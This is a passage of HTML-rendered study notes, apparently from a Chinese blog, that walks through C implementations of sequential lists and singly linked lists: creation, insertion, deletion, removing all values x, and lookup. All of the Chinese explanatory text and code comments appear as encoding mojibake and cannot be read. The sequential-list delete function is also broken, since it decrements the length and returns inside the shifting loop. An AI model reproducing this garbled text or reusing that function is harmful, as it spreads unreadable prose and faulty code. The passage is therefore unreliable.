ä¸ªæ•°</span></span><br><span class="line">    <span class="type">int</span> n;<span class="comment">//å®é™…å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">    DataType *elem;<span class="comment">//é¦–åœ°å€</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">SeqList</span>;</span><span class="comment">//æŠŠé¡ºåºè¡¨ç±»å‹åå­—æ¢æˆ *SeqList</span></span><br></pre></td></tr></table></figure><h3 id="é¡ºåºè¡¨å»ºç«‹å’Œåˆ¤ç©º"><a href="#é¡ºåºè¡¨å»ºç«‹å’Œåˆ¤ç©º" class="headerlink" title="é¡ºåºè¡¨å»ºç«‹å’Œåˆ¤ç©º"></a>é¡ºåºè¡¨å»ºç«‹å’Œåˆ¤ç©º</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SeqList <span class="title function_">SetNullList_Seq</span><span class="params">(<span class="type">int</span> m)</span><span class="comment">//åˆ›å»ºç©ºé¡ºåºè¡¨ï¼Œmä¸ºé¡ºåºè¡¨æœ€å¤§å€¼</span></span><br><span class="line">&#123;</span><br><span class="line">    SeqList slist = (SeqList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> List));<span class="comment">//ç”³è¯·ç»“æ„ä½“Listç©ºé—´</span></span><br><span class="line">    <span class="keyword">if</span>(slist != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem = (DataType*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DataType)*m);<span class="comment">//ç”³è¯·é¡ºåºè¡¨ç©ºé—´ï¼Œå¤§å°ä¸ºmä¸ªDataTypeç©ºé—´</span></span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;Max = m;<span class="comment">//é¡ºåºè¡¨æœ€å¤§å€¼</span></span><br><span class="line">        slist-&gt;n = <span class="number">0</span>;<span class="comment">//é¡ºåºè¡¨é•¿åº¦èµ‹å€¼ä¸º0</span></span><br><span class="line">            <span class="keyword">return</span>(slist);<span class="comment">//è¿”å›slisté¦–åœ°å€</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">free</span>(slist);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;out of space!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullList_seq</span><span class="params">(SeqList slist)</span><span class="comment">//åˆ¤æ–­é¡ºåºè¡¨æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(slist-&gt;n == <span class="number">0</span>);<span class="comment">//é¡ºåºè¡¨é•¿åº¦ä¸º0åˆ™æ˜¯ç©ºçš„ï¼Œå¦‚æœä¸ºç©º return(1)ï¼Œå¦‚æœä¸ä¸ºç©º return(0)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¡ºåºè¡¨æ’å…¥å…ƒç´ "><a href="#é¡ºåºè¡¨æ’å…¥å…ƒç´ " class="headerlink" title="é¡ºåºè¡¨æ’å…¥å…ƒç´ "></a>é¡ºåºè¡¨æ’å…¥å…ƒç´ </h3><ol><li>ç§»åŠ¨ç»“ç‚¹</li><li>æ’å…¥ç»“ç‚¹</li><li>&#x3D;&#x3D;å¢åŠ è¡¨é•¿&#x3D;&#x3D;</li><li>æ£€æŸ¥è¡¨ç©ºé—´æ˜¯å¦å·²æ»¡</li><li>æ£€æŸ¥æ’å…¥ä½ç½®æœ‰æ•ˆæ€§</li><li>&#x3D;&#x3D;ä»æœ€åä¸€ä¸ªç»“ç‚¹å¼€å§‹å‘åç§»åŠ¨&#x3D;&#x3D;</li><li>å¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯ O(n)</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">InsertPre_seq</span><span class="params">(SeqList slist, <span class="type">int</span> p, DataType x)</span><span class="comment">//åœ¨è¡¨slistçš„ p ä½ç½®ä¹‹å‰æ’å…¥ xï¼ŒæˆåŠŸè¿”å›1ï¼Œå¦åˆ™è¿”å›0</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span>(slist-&gt;n &gt;= slist-&gt;Max)<span class="comment">//æ£€æŸ¥è¡¨ç©ºé—´æ˜¯å¦å·²æ»¡</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;overflow&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p &lt; <span class="number">0</span> || p &gt; slist-&gt;n)<span class="comment">//æ£€æŸ¥æ’å…¥ä½ç½®æœ‰æ•ˆæ€§</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(q = slist-&gt;n - <span class="number">1</span>; q &gt;= p; q--)<span class="comment">//æ’å…¥ä½ç½®ä»¥åŠä¹‹åçš„å…ƒç´ åç§»</span></span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem[q+<span class="number">1</span>] = slist-&gt;elem[q];</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;elem[p] = x;<span class="comment">//æ’å…¥ x å…ƒç´ </span></span><br><span class="line">    slist-&gt;n = slist-&gt;n+<span class="number">1</span>;<span class="comment">//è¡¨é•¿+1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¡ºåºè¡¨åˆ é™¤"><a href="#é¡ºåºè¡¨åˆ é™¤" class="headerlink" title="é¡ºåºè¡¨åˆ é™¤"></a>é¡ºåºè¡¨åˆ é™¤</h3><ol><li>ç§»åŠ¨ç»“ç‚¹</li><li>&#x3D;&#x3D;å‡å°‘è¡¨é•¿&#x3D;&#x3D;</li><li>æ£€æŸ¥åˆ é™¤ä½ç½®æœ‰æ•ˆæ€§</li><li>&#x3D;&#x3D;ä»åˆ é™¤ä½ç½®çš„ä¸‹ä¸€ä¸ªå…ƒç´ å¼€å§‹ç§»åŠ¨&#x3D;&#x3D;</li><li>å¹³å‡æ—¶é—´å¤æ‚åº¦æ˜¯O(n)</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Delindex_seq</span><span class="params">(SeqList slist,<span class="type">int</span> p)</span><span class="comment">//åˆ é™¤ä¸‹æ ‡ä¸º p çš„å…ƒç´ </span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;</span><br><span class="line">    <span class="keyword">if</span>(p &lt; <span class="number">0</span> || p &gt;= slist-&gt;n)<span class="comment">//æ£€æŸ¥åˆ é™¤ä½ç½®æœ‰æ•ˆæ€§</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(q = p; q &lt; slist-&gt;n<span class="number">-1</span>; q++)<span class="comment">//pä½ç½®ä¹‹åçš„å…ƒç´ å‘å‰ç§»åŠ¨</span></span><br><span class="line">    &#123;</span><br><span class="line">        slist-&gt;elem[q] = slist-&gt;elem[q+<span class="number">1</span>];</span><br><span class="line">        slist-&gt;n = slist-&gt;n<span class="number">-1</span>;<span class="comment">//è¡¨é•¿-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè€å¸ˆå‡ºäº†ä¸€ä¸ªæ€è€ƒé¢˜ï¼Œå¦‚ä½•åˆ é™¤é¡ºåºè¡¨ä¸­æ‰€æœ‰å€¼ä¸º x çš„å…ƒç´ </p><p>æ€è·¯ï¼šæŠŠä¸ç­‰äº x çš„å…ƒç´ æå‡ºæ¥é‡æ–°æ”¾åˆ°ä¸€ä¸ªæ–°æ•°ç»„é‡Œï¼Œå»ºç«‹flagå˜é‡æ¥è®°å½•è¡¨é•¿</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">deleteX_seq</span><span class="params">(SeqList slist,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//å¾ªç¯å˜é‡</span></span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;<span class="comment">//å¾ªç¯å˜é‡</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; slist-&gt;n; i++)<span class="comment">//éå†é¡ºåºè¡¨</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem[i] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            slist-&gt;elem[flag] = slist-&gt;elem[i];<span class="comment">//æŠŠå€¼ä¸æ˜¯ x çš„å…ƒç´ æ”¾åˆ°æ–°æ•°ç»„é‡Œ</span></span><br><span class="line">            flag++;<span class="comment">//ç”¨æ¥è®°å½•æ–°çš„è¡¨é•¿</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    slist-&gt;n = flag;<span class="comment">//æ›´æ–°æ–°è¡¨é•¿</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¡ºåºè¡¨æŸ¥æ‰¾å®šä½"><a href="#é¡ºåºè¡¨æŸ¥æ‰¾å®šä½" class="headerlink" title="é¡ºåºè¡¨æŸ¥æ‰¾å®šä½"></a>é¡ºåºè¡¨æŸ¥æ‰¾å®šä½</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateIndex_seq</span><span class="params">(SeqList slist, <span class="type">int</span> x)</span><span class="comment">//éå†é¡ºåºè¡¨æŸ¥æ‰¾å€¼ä¸ºxçš„å…ƒç´ ï¼Œè¿”å›å…¶ä¸‹æ ‡</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;<span class="comment">//å¾ªç¯å˜é‡</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; slist-&gt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(slist-&gt;elem[i] == x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">//æŸ¥æ‰¾å¤±è´¥è¿”å›-1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å·²ç»æ’å¥½åºçš„é¡ºåºè¡¨å¯ä»¥é‡‡ç”¨äºŒåˆ†æ³•æŸ¥æ‰¾ï¼Œè¯¦è§ä¹¦P28é¡µ</p></blockquote><h2 id="å•é“¾è¡¨"><a href="#å•é“¾è¡¨" class="headerlink" title="å•é“¾è¡¨"></a>å•é“¾è¡¨</h2><ul><li>é“¾è¡¨ç”¨ä¸€ç»„&#x3D;&#x3D;ä»»æ„çš„å­˜å‚¨å•å…ƒ&#x3D;&#x3D;å­˜å‚¨çº¿æ€§è¡¨ä¸­å„å…ƒç´ ï¼Œé€šè¿‡æŒ‡é’ˆæ¥è¡¨ç¤ºæ•°æ®å…ƒç´ ä¹‹é—´çš„é€»è¾‘å…³ç³»ï¼Œæ•°æ®å…ƒç´ çš„é€»è¾‘å…³ç³»å’Œç‰©ç†å…³ç³»ä¸ä¸€æ ·</li><li>&#x3D;&#x3D;å•é“¾è¡¨çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§å°±æ˜¯åªèƒ½é€šè¿‡å‰é©±ç»“ç‚¹æ‰¾åˆ°åç»­ç»“ç‚¹ï¼Œè€Œæ— æ³•ä»åç»­ç»“ç‚¹æ‰¾åˆ°å‰é©±ç»“ç‚¹&#x3D;&#x3D;</li></ul><p><img src="https://img-blog.csdn.net/20180926161835379?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhaWR1XzQxODEzMzY4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://img-blog.csdn.net/20180825190821499?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21lbmdfbGVtb24=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><table><thead><tr><th align="center">å»ºç«‹</th><th align="center">æ’å…¥</th><th align="center">åˆ é™¤</th><th align="center">æŸ¥æ‰¾</th><th align="center">è¾“å‡º</th></tr></thead><tbody><tr><td align="center">å¤´æ’æ³•</td><td align="center">å‰æ’æ³•</td><td align="center">åˆ é™¤ P åç»§</td><td align="center">åºå·æŸ¥æ‰¾</td><td align="center">é¡ºåºæ‰“å°</td></tr><tr><td align="center">å°¾æ’æ³•</td><td align="center">åæ’æ³•</td><td align="center">åˆ é™¤ P æœ¬èº«</td><td align="center">å€¼æŸ¥æ‰¾</td><td align="center"></td></tr><tr><td align="center">é€’å½’æ³•</td><td align="center"></td><td align="center">æŒ‰å€¼åˆ é™¤</td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="é“¾è¡¨ç±»å‹å®šä¹‰"><a href="#é“¾è¡¨ç±»å‹å®šä¹‰" class="headerlink" title="é“¾è¡¨ç±»å‹å®šä¹‰"></a>é“¾è¡¨ç±»å‹å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DataType data;<span class="comment">//æ•°æ®åŸŸ</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span><span class="comment">//æŒ‡é’ˆåŸŸ</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">PNode</span>;</span><span class="comment">//ç»“ç‚¹ç±»å‹é‡å‘½å</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">LinkList</span>;</span><span class="comment">//å•é“¾è¡¨ç±»å‹é‡å‘½åï¼Œæ–¹ä¾¿åŒºåˆ†</span></span><br></pre></td></tr></table></figure><blockquote><p>æŒ‡é’ˆåŸŸä¸ºä»€ä¹ˆè¦å®šä¹‰æˆ <code>struct Node *</code>ç±»å‹ï¼Ÿ</p><p>è¿™ä¸ªé—®é¢˜æƒ³äº†æˆ‘äºŒååˆ†é’ŸT_Tï¼ŒåŸæ¥å°±æ˜¯å› ä¸ºæŒ‡é’ˆåŸŸçš„æŒ‡é’ˆè¦æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹ï¼Œä¸‹ä¸€ä¸ªç»“ç‚¹çš„æ•°æ®ç±»å‹å°±æ˜¯<code>struct Node</code>ç±»å‹ï¼Œéº»äº†ï¼Œåˆæ˜¯ç®€å•çš„é—®é¢˜æƒ³è€åŠå¤©</p></blockquote><h3 id="å•é“¾è¡¨å»ºç«‹å’Œåˆ¤ç©º"><a href="#å•é“¾è¡¨å»ºç«‹å’Œåˆ¤ç©º" class="headerlink" title="å•é“¾è¡¨å»ºç«‹å’Œåˆ¤ç©º"></a>å•é“¾è¡¨å»ºç«‹å’Œåˆ¤ç©º</h3><ul><li>å»ºç«‹å¸¦æœ‰å¤´ç»“ç‚¹çš„ç©ºçš„å•é“¾è¡¨ï¼Œä¸ºäº†æ–¹ä¾¿åé¢çš„ç®—æ³•è¿ç®—</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span><span class="comment">//åˆ›ä¸€ä¸ªå¸¦æœ‰å“¨å…µçš„ç©ºé“¾è¡¨</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//ç”³è¯·å¤´ç»“ç‚¹ç©ºé—´</span></span><br><span class="line">    <span class="keyword">if</span>(head != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        head-&gt;next =<span class="literal">NULL</span>;<span class="comment">//å¤´ç»“ç‚¹çš„æŒ‡é’ˆåŸŸèµ‹å€¼ä¸ºNULL</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Alloc failure&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;<span class="comment">//è¿”å›å¤´ç»“ç‚¹çš„åœ°å€</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNull_Link</span><span class="params">(LinkList head)</span><span class="comment">//åˆ¤ç©ºå‡½æ•°ï¼Œå¦‚æœä¸ºç©ºè¿”å›1ï¼Œä¸ä¸ºç©ºè¿”å›0</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span>(head-&gt;next == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å¤´æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨"><a href="#å¤´æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨" class="headerlink" title="å¤´æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨"></a>å¤´æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨</h4><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930005326.png" alt="æ­¥éª¤"></p><blockquote><p><strong>ç¬¬ä¸‰æ­¥å’Œç¬¬å››æ­¥ä¸èƒ½å¤Ÿé¢ å€’é¡ºåºï¼Œå¦‚æœå…ˆåšç¬¬å››æ­¥ï¼Œé‚£ä¹ˆå¤´ç»“ç‚¹ä¼šå’Œåé¢çš„ç»“ç‚¹æ–­å¼€è”ç³»</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Head</span><span class="params">(<span class="keyword">struct</span> Node *head)</span><span class="comment">//å¤´æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = <span class="literal">NULL</span>;<span class="comment">//å»ºç«‹ç©ºç»“ç‚¹</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ•´å‹æ•°æ®å»ºç«‹é“¾è¡¨ï¼Œä»¥-1ç»“æŸ\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);<span class="comment">//è¾“å…¥æ•°æ®åŸŸå†…çš„å€¼</span></span><br><span class="line">    <span class="keyword">while</span>(data != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//ä¸ºç©ºç»“ç‚¹ç”³è¯·å†…å­˜</span></span><br><span class="line">        p-&gt;data = data;<span class="comment">//æ•°æ®åŸŸèµ‹å€¼</span></span><br><span class="line">        p-&gt;next = head-&gt;next;<span class="comment">//å¤´ç»“ç‚¹æŒ‡é’ˆåŸŸèµ‹å€¼ç»™æ’å…¥èŠ‚ç‚¹çš„æŒ‡é’ˆåŸŸ</span></span><br><span class="line">        head-&gt;next = p;<span class="comment">//æ–°æ’å…¥ç»“ç‚¹åœ°å€èµ‹å€¼ç»™head-&gt;next</span></span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);<span class="comment">//è¾“å…¥ä¸‹ä¸€ä¸ªæ•°æ®ç»“ç‚¹çš„æ•°æ®åŸŸ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨"><a href="#å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨" class="headerlink" title="å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨"></a>å°¾æ’æ³•å»ºç«‹å•é“¾è¡¨</h4><p><img src="https://raw.githubusercontent.com/C1everF0x/Images/master/20200930014203.png" alt="æ­¥éª¤"></p><blockquote><p><strong>åŒæ ·çš„ç¬¬å››æ­¥å’Œç¬¬äº”æ­¥ä¸èƒ½è°ƒæ¢é¡ºåºï¼Œå¦‚æœå…ˆåšç¬¬äº”æ­¥ï¼Œå°¾æŒ‡é’ˆå°±ä¼šå¤±å»å’Œå°¾ç»“ç‚¹çš„è”ç³»ï¼Œå°±æ²¡åŠæ³•å†è¿›è¡Œç¬¬å››æ­¥äº†</strong></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node *head)</span><span class="comment">//å°¾æ’æ³•å»ºç«‹éç©ºå•é“¾è¡¨</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">q</span> =</span> head;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥æ•´å‹æ•°æ®å»ºç«‹é“¾è¡¨ï¼Œä»¥-1ç»“æŸ\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    <span class="keyword">while</span>(data != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//ä¸ºç©ºç»“ç‚¹ç”³è¯·å†…å­˜</span></span><br><span class="line">        p-&gt;data = data;<span class="comment">//æ–°ç»“ç‚¹æ•°æ®åŸŸèµ‹å€¼</span></span><br><span class="line">        p-&gt;next = <span class="literal">NULL</span>;<span class="comment">//æ’å…¥ç»“ç‚¹æŒ‡é’ˆåŸŸèµ‹å€¼ä¸ºNULL</span></span><br><span class="line">        q-&gt;next = p;<span class="comment">//æœ€åä¸€ä¸ªç»“ç‚¹æŒ‡é’ˆåŸŸæŒ‡å‘æ–°æ’å…¥ç»“ç‚¹</span></span><br><span class="line">        q = p;<span class="comment">//æœ€åä¸€ä¸ªç»“ç‚¹åœ°å€èµ‹å€¼ç»™å°¾æŒ‡é’ˆ</span></span><br><span class="line">        scanf_s(<span class="string">&quot;%d&quot;</span>, &amp;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å•é“¾è¡¨æŸ¥æ‰¾"><a href="#å•é“¾è¡¨æŸ¥æ‰¾" class="headerlink" title="å•é“¾è¡¨æŸ¥æ‰¾"></a>å•é“¾è¡¨æŸ¥æ‰¾</h3><h4 id="æŒ‰å€¼æŸ¥æ‰¾"><a href="#æŒ‰å€¼æŸ¥æ‰¾" class="headerlink" title="æŒ‰å€¼æŸ¥æ‰¾"></a>æŒ‰å€¼æŸ¥æ‰¾</h4><p>æ‰¾æ•°æ®åŸŸå€¼ä¸º<code>ç»™å®šå€¼x</code>çš„ç»“ç‚¹ï¼Œæ‰¾åˆ°çš„è¯ï¼Œè¿”å›å…¶ç¬¬ä¸€æ¬¡å‡ºç°çš„<code>å­˜å‚¨ä½ç½®</code>ï¼Œå¦åˆ™è¿”å›<code>NULL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PNode <span class="title function_">Locate_Link</span><span class="params">(LinkList llist, DataType x)</span><span class="comment">//ä¼ è¿›å»llisté“¾è¡¨ï¼ŒæŸ¥æ‰¾å€¼ä¸ºxçš„å…ƒç´ </span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p;<span class="comment">//ç”¨äºéå†é“¾è¡¨çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(llist == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    p = llist-&gt;next;<span class="comment">//pæŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªæœ‰æ•ˆç»“ç‚¹</span></span><br><span class="line">    <span class="keyword">while</span>(p != <span class="literal">NULL</span>&amp;&amp;p-&gt;data != x)<span class="comment">//å½“ p = NULLæ—¶æˆ– p-&gt;data=xæ—¶ï¼Œé€€å‡ºå¾ªç¯ï¼Œå¦åˆ™æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æŒ‰ç…§åºå·æŸ¥æ‰¾"><a 